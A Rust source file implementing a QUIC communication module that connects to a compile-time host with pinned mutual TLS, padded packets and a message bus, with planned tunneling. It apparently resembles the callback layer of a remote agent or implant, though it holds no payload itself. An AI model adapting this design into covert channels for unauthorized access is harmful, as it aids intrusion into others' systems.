use super::packet::PacketHeader;
use super::spki::SpkiVerifier;
use crate::bus::{BusMessage, Module, ModuleIdentity};
use quinn::crypto::rustls::QuicClientConfig;
use quinn::rustls::pki_types::{CertificateDer, PrivateKeyDer};
use quinn::{ClientConfig, Connection, Endpoint, TransportConfig};
use std::net::{Ipv4Addr, SocketAddrV4};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::sync::mpsc::{Receiver, Sender};
use tokio::time::timeout;
use tokio_util::sync::CancellationToken;
pub struct Quic {
    identity: ModuleIdentity,
    endpoint: Option<Endpoint>,
    connection: Option<Connection>,
    tx: Sender<BusMessage>,
    rx: Mutex<Option<Receiver<BusMessage>>>,
}

impl Quic {
    pub fn new() -> Quic {
        const MAX_MSG_BUFFER: usize = 1024;
        let (tx, rx) = tokio::sync::mpsc::channel::<BusMessage>(MAX_MSG_BUFFER);

        Quic {
            identity: ModuleIdentity::COMMS,
            connection: Default::default(),
            endpoint: Default::default(),
            tx,
            rx: Mutex::new(Some(rx)),
        }
    }

    pub async fn connect(&mut self) -> Result<(), ()> {
        const HOST: &str = env!("SOZO_HOST");
        const PORT: u16 = {
            match u16::from_str_radix(env!("SOZO_PORT"), 10) {
                Ok(p) => p,
                Err(_) => panic!(), /* due to this being a compile time rather than runtime check, panic is permitted here */
            }
        };
        const CONNECTION_TIMEOUT: u64 = 5;

        /* local udp bind address */
        let mut endpoint =
            Endpoint::client(SocketAddrV4::new(Ipv4Addr::UNSPECIFIED, 0).into()).map_err(|_| ())?;

        /* build client configuration that will be utilized during the connection attempt -- sets up mutual tls as well */
        endpoint.set_default_client_config(Self::build_client_config()?);

        /* attempt to resolve destination address domain resolution */
        let addr = tokio::net::lookup_host((HOST, PORT))
            .await
            .map_err(|_| ())?
            .next()
            .ok_or(())?;

        /* Pass resolved address + SNI (hostname) as part of QUIC connection requirements  */
        let conn = timeout(Duration::from_secs(CONNECTION_TIMEOUT), async {
            endpoint
                .connect(addr, HOST)
                .map_err(|_| ())?
                .await
                .map_err(|_| ())
        })
        .await
        .map_err(|_| ())
        .and_then(|r| r)?; /* Strips the surround Result<> -- So Result<Connection, ()> is all that is left */

        self.endpoint = Some(endpoint);
        self.connection = Some(conn);

        Ok(())
    }

    fn build_client_config() -> Result<ClientConfig, ()> {
        let cert_bytes = CertificateDer::from_slice(include_bytes!(env!("SOZO_CLIENT_CRT")));
        let mut client_crt: Vec<CertificateDer> = Vec::new();
        client_crt.try_reserve(1).map_err(|_| ())?;
        client_crt.push(cert_bytes);

        let client_key =
            PrivateKeyDer::try_from(include_bytes!(env!("SOZO_CLIENT_KEY")).as_slice())
                .map_err(|_| ())?;

        let cert_verifier = match SpkiVerifier::new() {
            Ok(v) => v,
            Err(_) => return Err(()),
        };

        let mut rustls_config = quinn::rustls::ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(cert_verifier))
            .with_client_auth_cert(client_crt, client_key)
            .map_err(|_| ())?;

        rustls_config.alpn_protocols = vec![b"sozo".to_vec()];

        let mut config = ClientConfig::new(Arc::new(
            QuicClientConfig::try_from(rustls_config).map_err(|_| ())?,
        ));

        let mut transport = TransportConfig::default();
        transport.keep_alive_interval(Some(Duration::from_secs(60)));
        transport.max_idle_timeout(Some(Duration::from_secs(300).try_into().map_err(|_| ())?));

        config.transport_config(Arc::new(transport));

        Ok(config)
    }
}

#[async_trait::async_trait]
impl Module for Quic {
    fn get_identity(&self) -> ModuleIdentity {
        self.identity
    }

    async fn run(&self, bus_channel: Sender<BusMessage>, shutdown: CancellationToken) {
        /* split connection into bidirectional stream so that we are able to write outbound data over the socket */
        let connection = match &self.connection {
            Some(c) => c,
            None => {
                shutdown.cancel();
                return;
            }
        };

        let (mut quic_tx, mut quic_rx) = match connection.open_bi().await {
            Ok(streams) => streams,
            Err(_) => {
                shutdown.cancel();
                return;
            }
        };

        let mut rx = match self.rx.lock().await.take() {
            Some(rx) => rx,
            None => {
                shutdown.cancel();
                return;
            }
        };

        /* spawning a separate tokio task to avoid any issues with handling partial reads and tracking internal offsets */
        let token = shutdown.clone();
        let _ = tokio::spawn(async move {
            let mut header = [0u8; size_of::<PacketHeader>()];
            let mut buffer: Vec<u8> = Vec::new();

            loop {
                /* attempt to read in packet header */
                if quic_rx.read_exact(&mut header).await.is_err() {
                    break;
                }

                let pkt_header = match PacketHeader::hdr_from_bytes(&header) {
                    Ok(p) => p,
                    Err(_) => {
                        break;
                    }
                };
                let buffer_size = (pkt_header.data_len + pkt_header.pad_len) as usize;

                /* calculate required buffer for inbound message and read remaining packet data and padding */
                if buffer.try_reserve(buffer_size).is_err() {
                    break;
                }
                buffer.resize(buffer_size, 0u8);

                if quic_rx.read_exact(&mut buffer).await.is_err() {
                    break;
                }

                /* drop trash padding and create message and route via bus */
                buffer.truncate(pkt_header.data_len as usize);

                let message = BusMessage {
                    identity: ModuleIdentity::new(pkt_header.identity),
                    remote: None,
                    msg: buffer,
                };

                if bus_channel.send(message).await.is_err() {
                    break;
                }

                /* buffer was moved -- reinstantiate */
                buffer = Vec::new();
            }
            token.cancel();
        });

        /* loop over cancellation token and writing all outbound messages from module bus over socket */
        loop {
            tokio::select! {
                _ = shutdown.cancelled() => {
                    break;
                }

                result = rx.recv() => {
                    match result {
                        Some(msg) => {
                            let packet = match PacketHeader::craft_packet(msg) {
                                Ok(p) => p,
                                Err(_) => break,
                            };

                            if quic_tx.write_all(&packet).await.is_err() {
                                break;
                            }}
                        None => break
                    }
                }
            }
        }

        let _ = quic_tx.finish();
        shutdown.cancel();
    }

    fn enqueue(&self, msg: BusMessage) -> bool {
        self.tx.try_send(msg).is_ok()
    }
}

/* TODO TUNNEL IMPL:
 * Single channel for main communication and all modules within the module bus
 * Once tunneling has been added, it will be an extension of Quinn and will be tied to QUIC streams directly -- this will bypass the module
*/

/* TODO: Listener
 * create a flag value within environment + a getter fn to determine current configuration ie get_config()
*/
